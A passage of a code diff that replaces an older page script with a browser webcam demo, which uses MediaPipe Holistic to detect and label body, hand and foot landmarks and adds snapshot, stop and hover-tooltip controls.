+    drawConnection(pose, POSE.R_ELBOW,    POSE.R_WRIST, COLORS.rightArm, 3);
+    drawConnection(pose, POSE.R_WRIST,    POSE.R_PINKY, COLORS.rightArm, 2);
+    drawConnection(pose, POSE.R_WRIST,    POSE.R_INDEX, COLORS.rightArm, 2);
+    drawConnection(pose, POSE.R_WRIST,    POSE.R_THUMB, COLORS.rightArm, 2);
 
-    const data = await res.json();
-    alert(data.message || data.error);
+    // Left leg
+    drawConnection(pose, POSE.L_HIP,   POSE.L_KNEE,        COLORS.leftLeg, 3);
+    drawConnection(pose, POSE.L_KNEE,  POSE.L_ANKLE,       COLORS.leftLeg, 3);
+    drawConnection(pose, POSE.L_ANKLE, POSE.L_HEEL,        COLORS.leftFoot, 2.5);
+    drawConnection(pose, POSE.L_ANKLE, POSE.L_FOOT_INDEX,  COLORS.leftFoot, 2.5);
+    drawConnection(pose, POSE.L_HEEL,  POSE.L_FOOT_INDEX,  COLORS.leftFoot, 2);
 
-  }, () => {
-    alert("Konum izni verilmedi.");
+    // Right leg
+    drawConnection(pose, POSE.R_HIP,   POSE.R_KNEE,        COLORS.rightLeg, 3);
+    drawConnection(pose, POSE.R_KNEE,  POSE.R_ANKLE,       COLORS.rightLeg, 3);
+    drawConnection(pose, POSE.R_ANKLE, POSE.R_HEEL,        COLORS.rightFoot, 2.5);
+    drawConnection(pose, POSE.R_ANKLE, POSE.R_FOOT_INDEX,  COLORS.rightFoot, 2.5);
+    drawConnection(pose, POSE.R_HEEL,  POSE.R_FOOT_INDEX,  COLORS.rightFoot, 2);
+
+    // Dots on key joints
+    const joints = [
+      [POSE.L_SHOULDER, COLORS.leftArm],  [POSE.R_SHOULDER, COLORS.rightArm],
+      [POSE.L_ELBOW,    COLORS.leftArm],  [POSE.R_ELBOW,    COLORS.rightArm],
+      [POSE.L_WRIST,    COLORS.leftArm],  [POSE.R_WRIST,    COLORS.rightArm],
+      [POSE.L_HIP,      COLORS.torso],    [POSE.R_HIP,      COLORS.torso],
+      [POSE.L_KNEE,     COLORS.leftLeg],  [POSE.R_KNEE,     COLORS.rightLeg],
+      [POSE.L_ANKLE,    COLORS.leftFoot], [POSE.R_ANKLE,    COLORS.rightFoot],
+      [POSE.L_HEEL,     COLORS.leftFoot], [POSE.R_HEEL,     COLORS.rightFoot],
+      [POSE.L_FOOT_INDEX, COLORS.leftFoot], [POSE.R_FOOT_INDEX, COLORS.rightFoot]
+    ];
+    joints.forEach(([idx, col]) => drawDot(pose, idx, col));
+
+    // Labels
+    drawLabel(pose, POSE.L_SHOULDER, 'L.Shoulder', COLORS.leftArm);
+    drawLabel(pose, POSE.R_SHOULDER, 'R.Shoulder', COLORS.rightArm);
+    drawLabel(pose, POSE.L_ELBOW,    'L.Elbow',    COLORS.leftArm);
+    drawLabel(pose, POSE.R_ELBOW,    'R.Elbow',    COLORS.rightArm);
+    drawLabel(pose, POSE.L_HIP,      'L.Hip',      COLORS.torso);
+    drawLabel(pose, POSE.R_HIP,      'R.Hip',      COLORS.torso);
+    drawLabel(pose, POSE.L_KNEE,     'L.Knee',     COLORS.leftLeg);
+    drawLabel(pose, POSE.R_KNEE,     'R.Knee',     COLORS.rightLeg);
+    drawLabel(pose, POSE.L_ANKLE,    'L.Ankle',    COLORS.leftFoot);
+    drawLabel(pose, POSE.R_ANKLE,    'R.Ankle',    COLORS.rightFoot);
+    drawLabel(pose, POSE.L_HEEL,     'L.Heel',     COLORS.leftFoot);
+    drawLabel(pose, POSE.R_HEEL,     'R.Heel',     COLORS.rightFoot);
+    drawLabel(pose, POSE.L_FOOT_INDEX,'L.Toe',     COLORS.leftFoot);
+    drawLabel(pose, POSE.R_FOOT_INDEX,'R.Toe',     COLORS.rightFoot);
+
+    lmCount += pose.length;
+
+    // Determine what's detected
+    const armVis = isVisible(pose, POSE.L_ELBOW) || isVisible(pose, POSE.R_ELBOW);
+    const legVis = isVisible(pose, POSE.L_KNEE)  || isVisible(pose, POSE.R_KNEE);
+    const torsoVis = isVisible(pose, POSE.L_SHOULDER) && isVisible(pose, POSE.R_SHOULDER);
+    const lFootVis = isVisible(pose, POSE.L_ANKLE);
+    const rFootVis = isVisible(pose, POSE.R_ANKLE);
+    const lArmVis  = isVisible(pose, POSE.L_ELBOW);
+    const rArmVis  = isVisible(pose, POSE.R_ELBOW);
+
+    setCard('left-foot',  'foot',  lFootVis, lFootVis ? '✓ Detected' : '—');
+    setCard('right-foot', 'foot',  rFootVis, rFootVis ? '✓ Detected' : '—');
+    setCard('arms',       'arm',   armVis,   armVis   ? '✓ Detected' : '—');
+    setCard('legs',       'leg',   legVis,   legVis   ? '✓ Detected' : '—');
+    setCard('torso',      'torso', torsoVis, torsoVis ? '✓ Detected' : '—');
+
+    if (armVis) parts++;
+    if (legVis) parts++;
+    if (torsoVis) parts++;
+    if (lFootVis) parts++;
+    if (rFootVis) parts++;
+
+    // Pose confidence (average of visible landmarks)
+    const visSum = pose.reduce((s,l) => s + (l.visibility || 0), 0) / pose.length;
+    setConf('pose', visSum);
+  } else {
+    ['left-foot','right-foot','arms','legs','torso'].forEach(id =>
+      setCard(id, 'foot', false, '—'));
+    setConf('pose', 0);
+  }
+
+  /* ── Hands ── */
+  drawHand(lh, COLORS.leftHand);
+  drawHand(rh, COLORS.rightHand);
+
+  if (lh) {
+    lmCount += lh.length;
+    parts++;
+    setCard('left-hand', 'hand', true, '✓ 21 pts');
+    drawLabel(lh, 0, 'L.Hand', COLORS.leftHand);
+    setConf('lh', 0.95);
+  } else {
+    setCard('left-hand', 'hand', false, '—');
+    setConf('lh', 0);
+  }
+  if (rh) {
+    lmCount += rh.length;
+    parts++;
+    setCard('right-hand', 'hand', true, '✓ 21 pts');
+    drawLabel(rh, 0, 'R.Hand', COLORS.rightHand);
+    setConf('rh', 0.95);
+  } else {
+    setCard('right-hand', 'hand', false, '—');
+    setConf('rh', 0);
+  }
+
+  ctx.restore();
+
+  // Update stats
+  document.getElementById('stat-landmarks').textContent = lmCount;
+  document.getElementById('stat-parts').textContent = parts;
+  partsDetected = parts;
+  totalLandmarks = lmCount;
+}
+
+/* ─── Start camera ─── */
+async function startCamera() {
+  startBtn.disabled = true;
+  errMsg.style.display = 'none';
+  loadOverlay.classList.remove('hidden');
+
+  setStatus('loading', 'Loading model…');
+
+  // Create Holistic
+  const holistic = new Holistic({
+    locateFile: file => `https://cdn.jsdelivr.net/npm/@mediapipe/holistic/${file}`
   });
-});
-</script>
 
+  holistic.setOptions({
+    modelComplexity: 1,
+    smoothLandmarks: true,
+    enableSegmentation: false,
+    smoothSegmentation: false,
+    refineFaceLandmarks: true,
+    minDetectionConfidence: 0.5,
+    minTrackingConfidence: 0.5
+  });
+
+  holistic.onResults(onResults);
+
+  // Request camera
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+      audio: false
+    });
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    await video.play();
+  } catch(e) {
+    loadOverlay.classList.add('hidden');
+    errMsg.style.display = 'block';
+    errMsg.textContent = '⚠️ ' + (e.message || 'Camera access denied.');
+    startBtn.disabled = false;
+    setStatus('error', 'Camera error');
+    return;
+  }
+
+  resizeCanvas(video.videoWidth, video.videoHeight);
+
+  // Camera utility
+  cameraInstance = new Camera(video, {
+    onFrame: async () => {
+      await holistic.send({ image: video });
+    },
+    width: video.videoWidth,
+    height: video.videoHeight
+  });
+
+  try {
+    await cameraInstance.start();
+  } catch(e) {
+    console.warn('Camera utility error:', e);
+  }
+
+  cameraRunning = true;
+  permOverlay.classList.add('hidden');
+  loadOverlay.classList.add('hidden');
+  setStatus('ready', 'Running');
+}
+
+/* ─── Status helper ─── */
+function setStatus(state, text) {
+  statusDot.className = state === 'ready' ? 'ready' : state === 'error' ? 'error' : '';
+  statusText.textContent = text;
+}
+
+/* ─── Snapshot ─── */
+document.getElementById('btn-snapshot').addEventListener('click', () => {
+  const link = dlLink;
+  link.href = canvas.toDataURL('image/png');
+  link.download = `limb-detection-${Date.now()}.png`;
+  link.click();
+});
+
+/* ─── Stop ─── */
+document.getElementById('btn-stop').addEventListener('click', () => {
+  if (video.srcObject) {
+    video.srcObject.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+  }
+  if (cameraInstance) {
+    try { cameraInstance.stop(); } catch(e) {}
+    cameraInstance = null;
+  }
+  cameraRunning = false;
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  setStatus('', 'Stopped');
+  permOverlay.classList.remove('hidden');
+  startBtn.disabled = false;
+  errMsg.style.display = 'none';
+});
+
+/* ─── Start button ─── */
+startBtn.addEventListener('click', startCamera);
+
+/* ─── Canvas mouse tooltip (hover nearest landmark) ─── */
+canvas.addEventListener('mousemove', e => {
+  if (!lastResults) return;
+  const rect = canvas.getBoundingClientRect();
+  const scaleX = canvas.width  / rect.width;
+  const scaleY = canvas.height / rect.height;
+  let mx = (e.clientX - rect.left) * scaleX;
+  let my = (e.clientY - rect.top)  * scaleY;
+  if (togMirror.checked) mx = canvas.width - mx;
+
+  const W = canvas.width, H = canvas.height;
+  let closest = null, minD = Infinity;
+
+  const NAMED = {
+    0:'Nose',11:'L.Shoulder',12:'R.Shoulder',13:'L.Elbow',14:'R.Elbow',
+    15:'L.Wrist',16:'R.Wrist',23:'L.Hip',24:'R.Hip',
+    25:'L.Knee',26:'R.Knee',27:'L.Ankle',28:'R.Ankle',
+    29:'L.Heel',30:'R.Heel',31:'L.Toe',32:'R.Toe'
+  };
+
+  if (lastResults.poseLandmarks) {
+    lastResults.poseLandmarks.forEach((lm, i) => {
+      const dx = lm.x * W - mx, dy = lm.y * H - my;
+      const d = Math.sqrt(dx*dx + dy*dy);
+      if (d < minD && d < 20) { minD = d; closest = { name: NAMED[i] || `Pose #${i}`, vis: lm.visibility }; }
+    });
+  }
+
+  if (closest) {
+    tooltip.style.display = 'block';
+    tooltip.style.left = (e.clientX - rect.left + 12) + 'px';
+    tooltip.style.top  = (e.clientY - rect.top  - 10) + 'px';
+    tooltip.textContent = `📌 ${closest.name}  (vis: ${(closest.vis*100).toFixed(0)}%)`;
+  } else {
+    tooltip.style.display = 'none';
+  }
+});
+canvas.addEventListener('mouseleave', () => { tooltip.style.display = 'none'; });
+</script>
 </body>
 </html>
